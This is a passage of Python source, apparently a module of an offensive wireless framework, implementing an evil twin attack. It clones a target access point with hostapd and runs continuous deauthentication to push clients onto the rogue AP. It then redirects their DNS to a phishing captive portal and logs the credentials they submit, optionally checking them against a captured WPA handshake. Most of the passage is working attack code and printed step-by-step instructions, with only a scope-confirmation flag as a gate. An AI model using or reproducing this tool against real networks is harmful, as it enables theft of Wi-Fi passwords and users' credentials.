        "info",
        "Operation: info | scan | list_templates | start | generate_config",
    )
    interface_ap = OptString(
        "wlan1",
        "Interface for the evil twin AP (must support AP/master mode)",
    )
    interface_mon = OptString(
        "wlan0mon",
        "Monitor-mode interface for AP scanning and deauth",
    )
    bssid = OptMAC(
        "00:00:00:00:00:00",
        "Target AP BSSID (required for deauth and handshake verify)",
    )
    ssid = OptString("", "Target SSID to broadcast on the evil twin")
    channel = OptInteger(6, "Wi-Fi channel to use for the evil twin AP")
    template = OptString(
        "router_admin",
        "Portal template name - see list_templates mode",
    )
    portal_ip = OptString("192.168.1.1", "Gateway IP for the rogue AP interface")
    dhcp_start = OptString("192.168.1.10", "DHCP address pool start")
    dhcp_end = OptString("192.168.1.100", "DHCP address pool end")
    http_port = OptInteger(80, "HTTP server port for the captive portal")
    verify_handshake = OptBool(
        True,
        "Verify submitted passwords against captured WPA handshake via aircrack-ng",
    )
    handshake_pcap = OptString(
        "",
        "Path to the captured WPA handshake pcap file",
    )
    deauth_continuous = OptBool(
        True,
        "Run continuous deauth against the real AP while portal is live",
    )
    scan_timeout = OptInteger(15, "AP scan duration in seconds")
    output_file = OptString(
        ".tmp/wxf-phishing-creds.json",
        "JSON file path for captured credentials",
    )
    i_know_scope = OptBool(
        False,
        "Confirm this is an authorized lab environment before live operation",
    )

    # -------------------------------------------------------------------
    def check(self) -> str:
        """Verify prerequisites: monitor interface, root, hostapd.

        Returns:
            Human-readable status string.
        """
        iface_mon = str(self.interface_mon).strip()
        issues: List[str] = []

        try:
            if os.geteuid() != 0:
                issues.append("root privileges required (sudo or run as root)")
        except AttributeError:
            pass  # Non-POSIX platform

        if not shutil.which("hostapd"):
            issues.append("hostapd not found - install: apt install hostapd")

        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", iface_mon],
                    stderr=subprocess.STDOUT,
                    timeout=5,
                ).decode("utf-8", errors="replace")
                if "Monitor" not in out:
                    issues.append(
                        f"{iface_mon} not in monitor mode - "
                        f"run: airmon-ng start {iface_mon}"
                    )
            except Exception:
                issues.append(f"could not verify monitor mode on {iface_mon}")
        elif shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"],
                    stderr=subprocess.STDOUT,
                    timeout=5,
                ).decode("utf-8", errors="replace")
                if iface_mon not in out:
                    issues.append(f"{iface_mon} not found in iw dev output")
            except Exception:
                pass

        if issues:
            return "Prerequisites not met: " + "; ".join(issues)
        return (
            f"Prerequisites OK - monitor={iface_mon}, "
            f"hostapd={shutil.which('hostapd')}"
        )

    # -------------------------------------------------------------------
    def run(self) -> None:
        """Entry point dispatched by the mode option."""
        op = str(self.mode).strip().lower()

        if op == "info":
            self._cmd_info()
            return
        if op == "list_templates":
            self._cmd_list_templates()
            return

        # Live operations require scope confirmation
        if not bool(self.i_know_scope):
            print_error(
                "Set i_know_scope = true to confirm this is an authorized "
                "lab environment before running live RF operations."
            )
            return
        require_authorised_lab()

        if op == "scan":
            self._cmd_scan()
        elif op == "generate_config":
            self._cmd_generate_config()
        elif op == "start":
            self._cmd_start()
        else:
            print_error(
                f"Unknown mode: {op}. "
                "Valid: info | scan | list_templates | start | generate_config"
            )

    # -------------------------------------------------------------------
    def _cmd_info(self) -> None:
        print_info("Phishing Engine - native evil twin + captive portal")
        print_info("=" * 60)
        print_info("")
        print_info("Attack flow (wifiphisher + fluxion):")
        print_info("  1. Scan APs         set mode scan; set interface_mon wlan0mon; run")
        print_info("  2. Pick target      note BSSID / SSID / channel from scan output")
        print_info("  3. Start portal     set mode start; set interface_ap wlan1; run")
        print_info("     - hostapd creates open evil twin AP")
        print_info("     - Deauth forces clients to associate with evil twin")
        print_info("     - All DNS redirected to portal")
        print_info("     - OS popup triggered (iOS/Android/Windows detection)")
        print_info("     - Template auto-selected by User-Agent + Accept-Language")
        print_info("     - Credentials captured, hashed, logged to JSON")
        print_info("     - Optional: aircrack-ng handshake verify on each submission")
        print_info("")
        self._cmd_list_templates()

    def _cmd_list_templates(self) -> None:
        available = _discover_available_templates()
        print_info(f"Available captive portal templates ({len(available)}):")
        print_info("-" * 50)
        for i, name in enumerate(available, 1):
            print_info(f"  {i:2d}. {name}")
        print_info(f"\n  Template root: {_TEMPLATE_DIR}")

    def _cmd_scan(self) -> None:
        iface = str(self.interface_mon).strip()
        if not iface:
            print_error("Set interface_mon (monitor-mode interface).")
            return

        timeout = max(1, int(self.scan_timeout))
        print_status(f"Scanning on {iface} for {timeout}s ...")
        scanner = APScanner(iface, timeout)
        aps = scanner.scan()

        if not aps:
            print_error(
                "No access points found. "
                "Ensure interface is in monitor mode and in range."
            )
            return

        print_success(f"Found {len(aps)} access point(s):")
        print_info("-" * 80)
        for i, ap in enumerate(aps, 1):
            print_info(f"  {i:3d}. {ap}")
        print_info("")
        print_info(
            "To clone an AP:  "
            "set bssid <BSSID>;  set ssid '<SSID>';  set channel <CH>"
        )

    def _cmd_generate_config(self) -> None:
        iface_ap = str(self.interface_ap).strip() or "wlan1"
        ssid = str(self.ssid).strip() or "FreeWiFi"
        channel = max(1, int(self.channel))
        portal_ip = str(self.portal_ip).strip()
        tmp = ".tmp"
        os.makedirs(tmp, exist_ok=True)

        conf_path = os.path.join(tmp, "wxf-hostapd.conf")
        content = (
            f"interface={iface_ap}\n"
            f"driver=nl80211\n"
            f"ssid={ssid}\n"
            f"hw_mode=g\n"
            f"channel={channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
            f"beacon_int=100\n"
        )
        with open(conf_path, "w", encoding="utf-8") as fh:
            fh.write(content)

        print_success("Configuration files generated:")
        print_info(f"  hostapd:  {conf_path}")
        print_info("")
        print_info("Manual startup sequence:")
        print_info(f"  sudo ip addr flush dev {iface_ap}")
        print_info(f"  sudo ip addr add {portal_ip}/24 dev {iface_ap}")
        print_info(f"  sudo ip link set {iface_ap} up")
        print_info(f"  sudo hostapd {conf_path} &")
        print_info(f"  # start DNS redirect on :53, DHCP on :67")
        print_info(f"  # start HTTP on :{self.http_port}")

    def _cmd_start(self) -> None:
        iface_ap = str(self.interface_ap).strip()
        iface_mon = str(self.interface_mon).strip()
        ssid = str(self.ssid).strip()
        bssid = str(self.bssid).strip()

        if not iface_ap:
            print_error("Set interface_ap (the AP interface, e.g. wlan1).")
            return
        if not ssid:
            print_error("Set ssid (the SSID to broadcast on the evil twin).")
            return

        print_status(f"Launching PhishingEngine - SSID={ssid!r}, CH={self.channel}")
        print_info(f"  AP interface:    {iface_ap}")
        print_info(f"  Monitor iface:   {iface_mon}")
        print_info(f"  Target BSSID:    {bssid}")
        print_info(f"  Portal IP:       {self.portal_ip}")
        print_info(f"  HTTP port:       {self.http_port}")
        print_info(f"  Template:        {self.template}")
        print_info(f"  Deauth:          {bool(self.deauth_continuous)}")
        print_info(f"  Verify handshake:{bool(self.verify_handshake)}")
        print_info(f"  Output:          {self.output_file}")

        engine = PhishingEngine(
            interface_ap=iface_ap,
            interface_mon=iface_mon,
            ssid=ssid,
            channel=max(1, int(self.channel)),
            bssid=bssid,
            template=str(self.template).strip(),
            portal_ip=str(self.portal_ip).strip(),
            dhcp_start=str(self.dhcp_start).strip(),
            dhcp_end=str(self.dhcp_end).strip(),
            http_port=max(1, int(self.http_port)),
            output_file=str(self.output_file).strip(),
            verify_handshake=bool(self.verify_handshake),
            handshake_pcap=str(self.handshake_pcap).strip(),
            deauth_continuous=bool(self.deauth_continuous),
            tmp_dir=".tmp",
        )
        engine.run()
